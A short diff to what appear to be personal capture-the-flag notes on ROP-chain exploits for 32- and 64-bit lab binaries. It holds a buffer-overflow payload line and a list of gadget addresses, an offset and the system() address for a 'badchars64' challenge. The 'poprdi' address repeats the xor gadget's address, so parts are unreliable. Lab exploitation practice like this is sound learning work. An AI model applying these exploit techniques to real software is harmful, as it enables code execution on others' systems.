@@ -39,5 +39,12 @@ payload: python -c 'print "\x41"*44 + "\xc0\x85\x04\x08" + "\xa9\x88\x04\x08" + 
 
 
 
-write32:
-
+badchars64:
+offset: 40 bytes
+pop r12; pop r13; ret;: 0x0000000000400b3b
+gotplt: 0x601000
+mov [r13], r12; ret;: 0x0000000000400b34
+pop r14; pop r15; ret;: 0x0000000000400b40
+xor [r15]; r14; ret;: 0x0000000000400b30
+poprdi: 0x400b30
+system(): 0x4006f0
